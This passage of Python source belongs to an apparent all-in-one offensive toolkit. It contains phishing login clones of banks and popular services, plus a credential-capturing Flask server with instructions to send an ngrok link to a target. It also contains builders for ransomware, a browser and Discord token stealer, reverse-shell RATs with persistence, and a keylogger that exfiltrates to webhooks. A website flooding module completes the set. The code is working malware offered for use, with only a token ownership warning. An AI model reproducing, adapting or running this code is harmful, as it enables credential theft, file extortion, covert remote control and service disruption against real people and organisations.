.btn{background:#5865f2;color:white;border:none;padding:14px;border-radius:4px;font-size:16px;font-weight:bold;width:100%;cursor:pointer;margin:10px 0}
.btn:hover{background:#4752c4}
.links a{color:#a7a7a7;text-decoration:none;font-size:14px;padding:0 10px}
</style>
</head>
<body>
<div class="container">
<div class="logo">Disc<span>ord</span></div>
<form method="POST" action="/login">
<input type="text" name="email" placeholder="Email or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit" class="btn">Log In</button>
</form>
<div class="links"><a href="#">Forgot password?</a> · <a href="#">Register</a></div>
</div>
</body></html>'''

def get_telegram_page():
    return '''<!DOCTYPE html>
<html>
<head><title>Telegram</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Helvetica,Arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;height:100vh}
.container{background:white;padding:40px;width:380px;text-align:center}
.logo{font-size:36px;font-weight:bold;color:#29a9e1;margin-bottom:20px}
input{width:100%;padding:14px 16px;border:1px solid #ddd;border-radius:4px;font-size:16px;margin:8px 0}
input:focus{outline:none;border-color:#29a9e1}
.btn{background:#29a9e1;color:white;border:none;padding:14px;border-radius:4px;font-size:16px;font-weight:bold;width:100%;cursor:pointer;margin:10px 0}
.btn:hover{background:#1a8bc7}
.links a{color:#29a9e1;text-decoration:none;font-size:14px;padding:0 10px}
</style>
</head>
<body>
<div class="container">
<div class="logo">Telegram</div>
<form method="POST" action="/login">
<input type="text" name="phone" placeholder="Phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit" class="btn">Sign In</button>
</form>
<div class="links"><a href="#">Forgot password?</a> · <a href="#">Create account</a></div>
</div>
</body></html>'''

def get_whatsapp_page():
    return '''<!DOCTYPE html>
<html>
<head><title>WhatsApp Web</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Helvetica,Arial,sans-serif;background:#111b21;display:flex;justify-content:center;align-items:center;height:100vh}
.container{background:#202c33;padding:40px;border-radius:8px;width:380px;text-align:center}
.logo{color:#00a884;font-size:36px;font-weight:bold;margin-bottom:20px}
input{width:100%;padding:14px 16px;border:0;border-radius:4px;background:#2a3942;color:white;font-size:16px;margin:8px 0}
input:focus{outline:none;background:#2a3942}
.btn{background:#00a884;color:white;border:none;padding:14px;border-radius:4px;font-size:16px;font-weight:bold;width:100%;cursor:pointer;margin:10px 0}
.btn:hover{background:#008f72}
.links a{color:#a7a7a7;text-decoration:none;font-size:14px;padding:0 10px}
</style>
</head>
<body>
<div class="container">
<div class="logo">WhatsApp</div>
<form method="POST" action="/login">
<input type="text" name="phone" placeholder="Phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit" class="btn">Sign In</button>
</form>
<div class="links"><a href="#">Forgot password?</a> · <a href="#">Create account</a></div>
</div>
</body></html>'''

def get_github_page():
    return '''<!DOCTYPE html>
<html>
<head><title>GitHub</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Segoe UI,Helvetica,Arial,sans-serif;background:#f6f8fa;display:flex;justify-content:center;align-items:center;height:100vh}
.container{background:white;padding:40px;border-radius:8px;width:380px;text-align:center}
.logo{font-size:36px;font-weight:bold;color:#24292f;margin-bottom:20px}
input{width:100%;padding:14px 16px;border:1px solid #ddd;border-radius:4px;font-size:16px;margin:8px 0}
input:focus{outline:none;border-color:#2f81f7}
.btn{background:#2f81f7;color:white;border:none;padding:14px;border-radius:4px;font-size:16px;font-weight:bold;width:100%;cursor:pointer;margin:10px 0}
.btn:hover{background:#2b6edb}
.links a{color:#2f81f7;text-decoration:none;font-size:14px;padding:0 10px}
</style>
</head>
<body>
<div class="container">
<div class="logo">GitHub</div>
<form method="POST" action="/login">
<input type="text" name="username" placeholder="Username or email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit" class="btn">Sign in</button>
</form>
<div class="links"><a href="#">Forgot password?</a> · <a href="#">Create account</a></div>
</div>
</body></html>'''

def get_roblox_page():
    return '''<!DOCTYPE html>
<html>
<head><title>Roblox</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Helvetica,Arial,sans-serif;background:#f5f5f5;display:flex;justify-content:center;align-items:center;height:100vh}
.container{background:white;padding:40px;border-radius:8px;width:380px;text-align:center}
.logo{font-size:32px;font-weight:bold;color:#dc143c;margin-bottom:20px}
input{width:100%;padding:14px 16px;border:1px solid #ddd;border-radius:4px;font-size:16px;margin:8px 0}
input:focus{outline:none;border-color:#dc143c}
.btn{background:#dc143c;color:white;border:none;padding:14px;border-radius:4px;font-size:16px;font-weight:bold;width:100%;cursor:pointer;margin:10px 0}
.btn:hover{background:#c01030}
.links a{color:#dc143c;text-decoration:none;font-size:14px;padding:0 10px}
</style>
</head>
<body>
<div class="container">
<div class="logo">Roblox</div>
<form method="POST" action="/login">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit" class="btn">Log In</button>
</form>
<div class="links"><a href="#">Forgot password?</a> · <a href="#">Sign up</a></div>
</div>
</body></html>'''

def get_twitch_page():
    return '''<!DOCTYPE html>
<html>
<head><title>Twitch</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Helvetica,Arial,sans-serif;background:#0e0e10;display:flex;justify-content:center;align-items:center;height:100vh}
.container{background:#1f1f23;padding:40px;border-radius:8px;width:380px;text-align:center}
.logo{color:#a970ff;font-size:32px;font-weight:bold;margin-bottom:20px}
input{width:100%;padding:14px 16px;border:0;border-radius:4px;background:#0e0e10;color:white;font-size:16px;margin:8px 0}
input:focus{outline:none;background:#1f1f23}
.btn{background:#a970ff;color:white;border:none;padding:14px;border-radius:4px;font-size:16px;font-weight:bold;width:100%;cursor:pointer;margin:10px 0}
.btn:hover{background:#8a5be0}
.links a{color:#a7a7a7;text-decoration:none;font-size:14px;padding:0 10px}
</style>
</head>
<body>
<div class="container">
<div class="logo">Twitch</div>
<form method="POST" action="/login">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit" class="btn">Log In</button>
</form>
<div class="links"><a href="#">Forgot password?</a> · <a href="#">Sign up</a></div>
</div>
</body></html>'''

def get_bofa_page():
    return '''<!DOCTYPE html>
<html>
<head><title>Bank of America</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Helvetica,Arial,sans-serif;background:#f5f5f5;display:flex;justify-content:center;align-items:center;height:100vh}
.container{background:white;padding:40px;border-radius:8px;width:380px;text-align:center}
.logo{font-size:28px;font-weight:bold;color:#c00000;margin-bottom:20px}
input{width:100%;padding:14px 16px;border:1px solid #ddd;border-radius:4px;font-size:16px;margin:8px 0}
input:focus{outline:none;border-color:#c00000}
.btn{background:#c00000;color:white;border:none;padding:14px;border-radius:4px;font-size:16px;font-weight:bold;width:100%;cursor:pointer;margin:10px 0}
.btn:hover{background:#a00000}
.links a{color:#c00000;text-decoration:none;font-size:14px;padding:0 10px}
</style>
</head>
<body>
<div class="container">
<div class="logo">Bank of America</div>
<form method="POST" action="/login">
<input type="text" name="username" placeholder="Online ID" required>
<input type="password" name="password" placeholder="Passcode" required>
<button type="submit" class="btn">Sign In</button>
</form>
<div class="links"><a href="#">Forgot ID/password?</a> · <a href="#">Enroll</a></div>
</div>
</body></html>'''

def get_chase_page():
    return '''<!DOCTYPE html>
<html>
<head><title>Chase Bank</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Helvetica,Arial,sans-serif;background:#f5f5f5;display:flex;justify-content:center;align-items:center;height:100vh}
.container{background:white;padding:40px;border-radius:8px;width:380px;text-align:center}
.logo{font-size:28px;font-weight:bold;color:#000;margin-bottom:20px}
.logo span{color:#1a3d7c}
input{width:100%;padding:14px 16px;border:1px solid #ddd;border-radius:4px;font-size:16px;margin:8px 0}
input:focus{outline:none;border-color:#1a3d7c}
.btn{background:#1a3d7c;color:white;border:none;padding:14px;border-radius:4px;font-size:16px;font-weight:bold;width:100%;cursor:pointer;margin:10px 0}
.btn:hover{background:#142f60}
.links a{color:#1a3d7c;text-decoration:none;font-size:14px;padding:0 10px}
</style>
</head>
<body>
<div class="container">
<div class="logo">CHASE <span>BANK</span></div>
<form method="POST" action="/login">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit" class="btn">Sign in</button>
</form>
<div class="links"><a href="#">Forgot username/password?</a> · <a href="#">Enroll</a></div>
</div>
</body></html>'''

# ==================== MODULE 22 - PHISHING ATTACK ====================
def module_22_phishing_attack():
    """Phishing Attack with real clone pages, redirect, and terminal output"""
    print("\n" + "="*60)
    print("PHISHING PAGE CLONER")
    print("="*60)
    print("\nSelect phishing page to clone:")
    print("\n[01] Google Login")
    print("[02] Facebook Login")
    print("[03] Instagram Login")
    print("[04] Twitter/X Login")
    print("[05] TikTok Login")
    print("[06] Snapchat Login")
    print("[07] LinkedIn Login")
    print("[08] Reddit Login")
    print("[09] YouTube Login")
    print("[10] Amazon Login")
    print("[11] PayPal Login")
    print("[12] Apple Login")
    print("[13] Microsoft Login")
    print("[14] Yahoo Login")
    print("[15] Gmail Login")
    print("[16] Spotify Login")
    print("[17] Netflix Login")
    print("[18] Steam Login")
    print("[19] Discord Login")
    print("[20] Telegram Login")
    print("[21] WhatsApp Login")
    print("[22] GitHub Login")
    print("[23] Roblox Login")
    print("[24] Twitch Login")
    print("[25] Bank of America Login")
    print("[26] Chase Login")
    print("[27] Custom URL")
    print("\n[0] Back to main menu")

    choice = input("\nSelect page > ").strip()

    if choice == '0':
        return

    # Define real redirect URLs for each page
    real_urls = {
        '01': 'https://accounts.google.com/',
        '02': 'https://www.facebook.com/',
        '03': 'https://www.instagram.com/',
        '04': 'https://twitter.com/',
        '05': 'https://www.tiktok.com/',
        '06': 'https://www.snapchat.com/',
        '07': 'https://www.linkedin.com/',
        '08': 'https://www.reddit.com/',
        '09': 'https://www.youtube.com/',
        '10': 'https://www.amazon.com/',
        '11': 'https://www.paypal.com/',
        '12': 'https://appleid.apple.com/',
        '13': 'https://login.live.com/',
        '14': 'https://login.yahoo.com/',
        '15': 'https://mail.google.com/',
        '16': 'https://www.spotify.com/',
        '17': 'https://www.netflix.com/',
        '18': 'https://store.steampowered.com/',
        '19': 'https://discord.com/',
        '20': 'https://web.telegram.org/',
        '21': 'https://web.whatsapp.com/',
        '22': 'https://github.com/',
        '23': 'https://www.roblox.com/',
        '24': 'https://www.twitch.tv/',
        '25': 'https://www.bankofamerica.com/',
        '26': 'https://www.chase.com/',
        '27': 'https://example.com/'
    }

    phishing_pages = {
        '01': ('Google', get_google_page()),
        '02': ('Facebook', get_facebook_page()),
        '03': ('Instagram', get_instagram_page()),
        '04': ('Twitter', get_twitter_page()),
        '05': ('TikTok', get_tiktok_page()),
        '06': ('Snapchat', get_snapchat_page()),
        '07': ('LinkedIn', get_linkedin_page()),
        '08': ('Reddit', get_reddit_page()),
        '09': ('YouTube', get_youtube_page()),
        '10': ('Amazon', get_amazon_page()),
        '11': ('PayPal', get_paypal_page()),
        '12': ('Apple', get_apple_page()),
        '13': ('Microsoft', get_microsoft_page()),
        '14': ('Yahoo', get_yahoo_page()),
        '15': ('Gmail', get_gmail_page()),
        '16': ('Spotify', get_spotify_page()),
        '17': ('Netflix', get_netflix_page()),
        '18': ('Steam', get_steam_page()),
        '19': ('Discord', get_discord_page()),
        '20': ('Telegram', get_telegram_page()),
        '21': ('WhatsApp', get_whatsapp_page()),
        '22': ('GitHub', get_github_page()),
        '23': ('Roblox', get_roblox_page()),
        '24': ('Twitch', get_twitch_page()),
        '25': ('Bank of America', get_bofa_page()),
        '26': ('Chase', get_chase_page()),
        '27': ('Custom', None)
    }

    if choice == '27':
        print("\nEnter the URL of the page to clone:")
        target = input("> ").strip()
        print("Enter the real URL to redirect after login:")
        redirect_url = input("> ").strip()
        try:
            import requests
            r = requests.get(target, timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
            html = r.text
            html = html.replace('</form>', '<input type="hidden" name="__capture" value="1"></form>')
            html = html.replace('<form', '<form action="/login" method="POST"')
            page_name = target.split('//')[1].split('/')[0]
        except:
            print("Failed to fetch page. Using fallback.")
            html = f'''<html><body style="background:#1a1a1a;color:white;text-align:center;padding-top:100px;font-family:monospace;">
            <h1>Login - {target}</h1>
            <form method="POST" action="/login">
            <input type="text" name="username" placeholder="Username"><br>
            <input type="password" name="password" placeholder="Password"><br>
            <button type="submit">Login</button>
            </form></body></html>'''
            page_name = "Custom"
    else:
        if choice not in phishing_pages:
            print("Invalid choice")
            return
        page_name, html = phishing_pages[choice]
        redirect_url = real_urls.get(choice, 'https://example.com/')

    try:
        from flask import Flask, request, render_template_string, redirect
    except ImportError:
        print("[!] Flask not installed. Run: pip install flask")
        return

    app = Flask(__name__)

    @app.route('/')
    def index():
        return render_template_string(html)

    @app.route('/login', methods=['POST'])
    def login():
        data = dict(request.form)
        ip = request.remote_addr
        user_agent = request.headers.get('User-Agent')

        # Print credentials to terminal
        print("\n" + "="*60)
        print("[+] CREDENTIALS CAPTURED!")
        print("="*60)
        print(f"[+] Page: {page_name}")
        print(f"[+] Time: {datetime.now()}")
        print(f"[+] IP: {ip}")
        print(f"[+] User-Agent: {user_agent}")
        print("-"*40)
        for key, value in data.items():
            if key != '__capture':
                print(f"[+] {key}: {value}")
        print("="*60 + "\n")

        # Log to file
        with open(os.path.join(OUTPUT_DIR, 'phishing_log.txt'), 'a') as f:
            f.write(f"\n{'='*50}\n")
            f.write(f"Time: {datetime.now()}\n")
            f.write(f"Page: {page_name}\n")
            f.write(f"IP: {ip}\n")
            f.write(f"User-Agent: {user_agent}\n")
            for key, value in data.items():
                if key != '__capture':
                    f.write(f"{key}: {value}\n")
            f.write(f"{'='*50}\n")

        # Redirect to real website
        return redirect(redirect_url)

    print(f"\n[+] Phishing server running on http://localhost:8080")
    print(f"[+] Page: {page_name}")
    print(f"[+] Redirect URL: {redirect_url}")
    print(f"[+] Credentials saved to: {os.path.join(OUTPUT_DIR, 'phishing_log.txt')}")
    print("[+] Credentials will also print to this terminal when captured")
    print("\n[!] To expose to the internet, use ngrok:")
    print("    - Download ngrok from https://ngrok.com")
    print("    - Run: ngrok http 8080")
    print("    - Copy the https://xxxx.ngrok.io URL")
    print("    - Send that URL to your target")
    print("[+] Press Ctrl+C to stop server")

    try:
        app.run(host='0.0.0.0', port=8080, debug=False, threaded=True)
    except Exception as e:
        print(f"Server error: {e}")

# ==================== MODULE 03 - RANSOMWARE ====================
def module_03_ransomware_builder():
    """Fully functional ransomware builder"""
    print("\n" + "="*50)
    print("RANSOMWARE BUILDER")
    print("="*50)
    print("\n[!] This builds a working ransomware script.")
    print("[!] Only use on systems you own.")
    print("\nEnter BTC address for ransom:")
    btc = input("> ").strip()
    print("Enter ransom amount in BTC (default 0.1):")
    amount = input("> ").strip() or "0.1"
    print("Enter ransom note text:")
    note = input("> ").strip()
    print("Enter webhook URL for key exfiltration:")
    webhook = input("> ").strip()

    script = f'''import os, sys, base64, hashlib, random, time, requests, threading, json
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

BTC = "{btc}"
AMOUNT = "{amount}"
NOTE = """{note}"""
WEBHOOK = "{webhook}"
EXTENSIONS = ['.txt', '.doc', '.docx', '.pdf', '.jpg', '.png', '.xls', '.xlsx', '.ppt', '.pptx', '.zip', '.rar', '.7z']
EXCLUDE = ['Windows', 'Program Files', 'Program Files (x86)', 'System32', 'AppData']

def encrypt_file(path):
    try:
        key = Fernet.generate_key()
        f = Fernet(key)
        with open(path, 'rb') as file:
            data = file.read()
        enc = f.encrypt(data)
        with open(path + '.encrypted', 'wb') as file:
            file.write(enc)
        os.remove(path)
        return key
    except:
        return None

def send_key(key, path):
    try:
        requests.post(WEBHOOK, json={{"key": key.decode(), "file": path, "time": str(time.time())}})
    except:
        pass

def get_desktop():
    if os.name == 'nt':
        return os.path.join(os.environ['USERPROFILE'], 'Desktop')
    else:
        return os.path.join(os.path.expanduser('~'), 'Desktop')

def drop_note():
    note_text = f"""
    ============================================
           YOUR FILES HAVE BEEN ENCRYPTED
    ============================================

    All your files have been encrypted with AES-256.

    To decrypt your files, you must pay {AMOUNT} BTC to:

    BTC Address: {BTC}

    {NOTE}

    Do not attempt to decrypt files yourself.
    Do not contact law enforcement.
    Do not shut down or restart your computer.

    After payment, send your computer ID to the email
    that was provided in the note.

    ============================================
    """
    note_path = os.path.join(get_desktop(), "READ_ME_NOW.txt")
    with open(note_path, 'w') as f:
        f.write(note_text)

def main():
    keys = []
    for root, dirs, files in os.walk(os.path.expanduser("~")):
        skip = False
        for ex in EXCLUDE:
            if ex in root:
                skip = True
                break
        if skip:
            continue
        for file in files:
            ext = os.path.splitext(file)[1].lower()
            if ext in EXTENSIONS:
                path = os.path.join(root, file)
                key = encrypt_file(path)
                if key:
                    keys.append((key, path))
                    send_key(key, path)
    drop_note()
    print("[+] Ransomware executed successfully.")

if __name__ == "__main__":
    main()
'''
    out = os.path.join(OUTPUT_DIR, "ransomware.py")
    with open(out, 'w') as f:
        f.write(script)
    print(f"\n[+] Ransomware saved to: {out}")
    print("[+] To use: python ransomware.py")
    print("[+] WARNING: This will encrypt files on the target system.")
    log_result("Ransomware Builder completed")

# ==================== MODULE 29 - STEALER ====================
def module_29_stealer():
    """Functional data stealer"""
    print("\n" + "="*50)
    print("STEALER BUILDER")
    print("="*50)
    print("\n[!] This builds a working data stealer.")
    print("[!] Only use on systems you own.")
    print("\nEnter webhook URL for exfiltration:")
    webhook = input("> ").strip()
    print("Enter output filename (default stealer.py):")
    outfile = input("> ").strip() or "stealer.py"

    script = f'''import os, sys, json, base64, sqlite3, shutil, requests, platform, subprocess, time, zipfile, glob, re, shutil
from PIL import ImageGrab
import cv2

WEBHOOK = "{webhook}"
IS_WIN = platform.system() == "Windows"
IS_LINUX = platform.system() == "Linux"

def get_tokens():
    tokens = []
    try:
        if IS_WIN:
            paths = glob.glob(os.path.expandvars("%APPDATA%\\\\discord\\\\Local Storage\\\\leveldb\\\\*.log"))
        else:
            paths = glob.glob(os.path.expanduser("~/.config/discord/Local Storage/leveldb/*.log"))
        for p in paths:
            with open(p, 'r', errors='ignore') as f:
                for line in f:
                    matches = re.findall(r'[\\w-]{{24,}}\\.[\\w-]{{6,}}\\.[\\w-]{{27,}}', line)
                    tokens.extend(matches)
    except:
        pass
    return tokens

def get_chrome_passwords():
    passwords = []
    try:
        if IS_WIN:
            chrome_path = os.path.expandvars("%LOCALAPPDATA%\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data")
        else:
            chrome_path = os.path.expanduser("~/.config/google-chrome/Default/Login Data")
        if os.path.exists(chrome_path):
            temp_db = "/tmp/chrome_login.db"
            shutil.copy2(chrome_path, temp_db)
            conn = sqlite3.connect(temp_db)
            c = conn.cursor()
            c.execute("SELECT origin_url, username_value, password_value FROM logins")
            for row in c.fetchall():
                passwords.append({{"url": row[0], "username": row[1]}})
            conn.close()
            os.remove(temp_db)
    except:
        pass
    return passwords

def get_system_info():
    return {{
        "hostname": platform.node(),
        "os": platform.system() + " " + platform.release(),
        "user": os.getlogin(),
        "cpu": os.cpu_count(),
        "time": time.time()
    }}

def steal():
    data = {{
        "system": get_system_info(),
        "tokens": get_tokens(),
        "passwords": get_chrome_passwords()
    }}

    try:
        img = ImageGrab.grab()
        img.save("/tmp/screen.png")
        data["screenshot"] = "/tmp/screen.png"
    except:
        pass

    try:
        requests.post(WEBHOOK, json=data, timeout=10)
    except:
        pass

    try:
        if os.path.exists("/tmp/screen.png"):
            with open("/tmp/screen.png", 'rb') as f:
                requests.post(WEBHOOK, files={{"file": f}})
    except:
        pass

if __name__ == "__main__":
    steal()
'''
    out = os.path.join(OUTPUT_DIR, outfile)
    with open(out, 'w') as f:
        f.write(script)
    print(f"\n[+] Stealer saved to: {out}")
    print("[+] To use: python stealer.py")
    log_result("Stealer created")

# ==================== MODULE 30 - MALWARE ====================
def module_30_malware():
    print("\n" + "="*50)
    print("MALWARE / RAT BUILDER")
    print("="*50)
    print("\n[1] Windows RAT (Reverse TCP)")
    print("[2] Linux RAT (Reverse TCP)")
    print("[3] Cross-platform RAT")
    print("[4] Keylogger")
    print("[5] Ransomware (module 03)")
    print("[6] Stealer (module 29)")
    print("\n[0] Back to main menu")

    choice = input("\nSelect malware type > ").strip()

    if choice == '0':
        return
    elif choice == '1':
        build_windows_rat()
    elif choice == '2':
        build_linux_rat()
    elif choice == '3':
        build_cross_rat()
    elif choice == '4':
        build_keylogger()
    elif choice == '5':
        module_03_ransomware_builder()
    elif choice == '6':
        module_29_stealer()
    else:
        print("Invalid choice")

def build_windows_rat():
    print("\n" + "-"*40)
    print("WINDOWS RAT BUILDER")
    print("-"*40)

    print("Enter your IP address (listener):")
    ip = input("> ").strip()
    print("Enter port (default 4444):")
    port = input("> ").strip() or "4444"
    print("Enter output filename (default windows_rat.py):")
    outfile = input("> ").strip() or "windows_rat.py"
    print("Enable persistence? (y/n, default y):")
    persist = input("> ").strip().lower() or "y"

    rat_code = f'''import socket, subprocess, os, sys, time, threading, platform
SERVER_IP = "{ip}"
SERVER_PORT = int({port})
PERSISTENCE = {str(persist == 'y').lower()}
IS_WIN = platform.system() == "Windows"

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, SERVER_PORT))
            return s
        except:
            time.sleep(5)

def execute_cmd(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return result.stdout + result.stderr
    except Exception as e:
        return str(e)

def persist_windows():
    if not PERSISTENCE or not IS_WIN: return
    try:
        import winreg
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(handle, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable + " " + __file__)
        winreg.CloseKey(handle)
    except: pass

def main():
    persist_windows()
    s = connect()
    while True:
        try:
            cmd = s.recv(1024).decode().strip()
            if not cmd: continue
            if cmd.lower() == 'exit':
                s.close()
                time.sleep(2)
                s = connect()
                continue
            if cmd.lower() == 'sysinfo':
                info = f"OS: {{platform.system()}}\nHost: {{platform.node()}}\nUser: {{os.getlogin()}}"
                s.send(info.encode())
                continue
            result = execute_cmd(cmd)
            s.send(result.encode())
        except:
            s.close()
            time.sleep(5)
            s = connect()
if __name__ == "__main__": main()
'''
    out_path = os.path.join(OUTPUT_DIR, outfile)
    with open(out_path, 'w') as f:
        f.write(rat_code)
    print(f"\n[+] Windows RAT saved to: {out_path}")
    print(f"[+] Listener setup: nc -lvnp {port}")
    if IS_WINDOWS:
        print("[+] To compile to EXE: pip install pyinstaller && pyinstaller --onefile --noconsole " + outfile)
    log_result(f"Windows RAT built: {out_path}")

def build_linux_rat():
    print("\n" + "-"*40)
    print("LINUX RAT BUILDER")
    print("-"*40)

    print("Enter your IP address (listener):")
    ip = input("> ").strip()
    print("Enter port (default 4444):")
    port = input("> ").strip() or "4444"
    print("Enter output filename (default linux_rat.py):")
    outfile = input("> ").strip() or "linux_rat.py"
    print("Enable persistence (cron)? (y/n, default y):")
    persist = input("> ").strip().lower() or "y"

    rat_code = f'''#!/usr/bin/env python3
import socket, subprocess, os, sys, time, threading, platform
SERVER_IP = "{ip}"
SERVER_PORT = int({port})
PERSISTENCE = {str(persist == 'y').lower()}

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, SERVER_PORT))
            return s
        except:
            time.sleep(5)

def execute_cmd(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return result.stdout + result.stderr
    except Exception as e:
        return str(e)

def persist_linux():
    if not PERSISTENCE: return
    try:
        cron = os.path.expanduser("~/.config/cron")
        os.makedirs(os.path.dirname(cron), exist_ok=True)
        with open(cron, 'w') as f:
            f.write(f"@reboot python3 {{__file__}}\\n")
        os.system(f"crontab {{cron}}")
    except: pass

def main():
    persist_linux()
    s = connect()
    while True:
        try:
            cmd = s.recv(1024).decode().strip()
            if not cmd: continue
            if cmd.lower() == 'exit':
                s.close()
                time.sleep(2)
                s = connect()
                continue
            if cmd.lower() == 'sysinfo':
                info = f"OS: {{platform.system()}}\nHost: {{platform.node()}}\nUser: {{os.getlogin()}}"
                s.send(info.encode())
                continue
            result = execute_cmd(cmd)
            s.send(result.encode())
        except:
            s.close()
            time.sleep(5)
            s = connect()
if __name__ == "__main__": main()
'''
    out_path = os.path.join(OUTPUT_DIR, outfile)
    with open(out_path, 'w') as f:
        f.write(rat_code)
    if not IS_WINDOWS:
        os.chmod(out_path, 0o755)
    print(f"\n[+] Linux RAT saved to: {out_path}")
    print(f"[+] Listener setup: nc -lvnp {port}")
    log_result(f"Linux RAT built: {out_path}")

def build_cross_rat():
    print("\n" + "-"*40)
    print("CROSS-PLATFORM RAT BUILDER")
    print("-"*40)

    print("Enter your IP address (listener):")
    ip = input("> ").strip()
    print("Enter port (default 4444):")
    port = input("> ").strip() or "4444"
    print("Enter output filename (default cross_rat.py):")
    outfile = input("> ").strip() or "cross_rat.py"

    rat_code = f'''import socket, subprocess, os, sys, time, threading, platform
SERVER_IP = "{ip}"
SERVER_PORT = int({port})
IS_WIN = platform.system() == "Windows"

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, SERVER_PORT))
            return s
        except:
            time.sleep(5)

def execute_cmd(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return result.stdout + result.stderr
    except Exception as e:
        return str(e)

def persist():
    try:
        if IS_WIN:
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(handle, "SystemUpdate", 0, winreg.REG_SZ, sys.executable + " " + __file__)
            winreg.CloseKey(handle)
        else:
            cron = os.path.expanduser("~/.config/cron")
            os.makedirs(os.path.dirname(cron), exist_ok=True)
            with open(cron, 'w') as f:
                f.write(f"@reboot python3 {{__file__}}\\n")
            os.system(f"crontab {{cron}}")
    except: pass

def main():
    persist()
    s = connect()
    while True:
        try:
            cmd = s.recv(1024).decode().strip()
            if not cmd: continue
            if cmd.lower() == 'exit':
                s.close()
                time.sleep(2)
                s = connect()
                continue
            if cmd.lower() == 'sysinfo':
                info = f"OS: {{platform.system()}}\nHost: {{platform.node()}}\nUser: {{os.getlogin()}}"
                s.send(info.encode())
                continue
            result = execute_cmd(cmd)
            s.send(result.encode())
        except:
            s.close()
            time.sleep(5)
            s = connect()
if __name__ == "__main__": main()
'''
    out_path = os.path.join(OUTPUT_DIR, outfile)
    with open(out_path, 'w') as f:
        f.write(rat_code)
    print(f"\n[+] Cross-platform RAT saved to: {out_path}")
    print(f"[+] Listener setup: nc -lvnp {port}")
    log_result(f"Cross-platform RAT built: {out_path}")

def build_keylogger():
    print("\n" + "-"*40)
    print("KEYLOGGER BUILDER")
    print("-"*40)

    print("Enter webhook URL for exfiltration:")
    webhook = input("> ").strip()
    print("Enter output filename (default keylogger.py):")
    outfile = input("> ").strip() or "keylogger.py"

    script = f'''import os, sys, time, threading, platform, requests
try:
    from pynput import keyboard
except ImportError:
    print("pynput not installed. Run: pip install pynput")
    sys.exit(1)
WEBHOOK = "{webhook}"
IS_WIN = platform.system() == "Windows"
log = []
last_send = time.time()

def send_log():
    global log, last_send
    if log and (time.time() - last_send > 30):
        data = ''.join(log)
        try:
            requests.post(WEBHOOK, json={{"content": data}})
        except: pass
        log.clear()
        last_send = time.time()

def on_press(key):
    global log
    try:
        log.append(key.char)
    except:
        log.append(str(key))
    if len(log) > 100:
        send_log()

def persist():
    try:
        if IS_WIN:
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(handle, "Keylogger", 0, winreg.REG_SZ, sys.executable + " " + __file__)
            winreg.CloseKey(handle)
    except: pass

def main():
    persist()
    with keyboard.Listener(on_press=on_press) as listener:
        while True:
            time.sleep(10)
            send_log()
if __name__ == "__main__": main()
'''
    out_path = os.path.join(OUTPUT_DIR, outfile)
    with open(out_path, 'w') as f:
        f.write(script)
    print(f"\n[+] Keylogger saved to: {out_path}")
    log_result(f"Keylogger built: {out_path}")

# ==================== MODULE 04 - WEBSITE DOS ====================
def module_04_website_dos():
    print("\nEnter target URL:")
    url = input("> ").strip()
    print("Thread count (default 500):")
    threads = int(input("> ") or "500")
    print("Duration in seconds (default 60):")
    dur = int(input("> ") or "60")
    proxies = [
        "http://183.166.119.129:8090", "http://106.75.99.245:3128",
        "http://201.209.118.18:8080", "http://157.245.112.12:3128"
    ]
    def flood():
        end = time.time() + dur
        while time.time() < end:
            try:
                p = random.choice(proxies)
                r = requests.get(url, proxies={'http':p, 'https':p}, timeout=2, headers={'User-Agent': 'Mozilla/5.0'})
            except: pass
    for i in range(threads):
        threading.Thread(target=flood).start()
    print(f"DoS started with {threads} threads for {dur}s")
    time.sleep(dur)
    log_result("Website DoS completed")

# ==================== MODULE 01 - PYTHON OBFUSCATOR ====================
def module_01_python_obfuscator():
    print("\nEnter path to Python file to obfuscate:")
    path = input("> ").strip()
    if not os.path.exists(path):
        print("File not found.")
        return
    with open(path, 'r') as f:
        code = f.read()
    lines = code.split('\n')
    obf = []
    for line in lines:
        def repl(m):
            s = m.group(0)
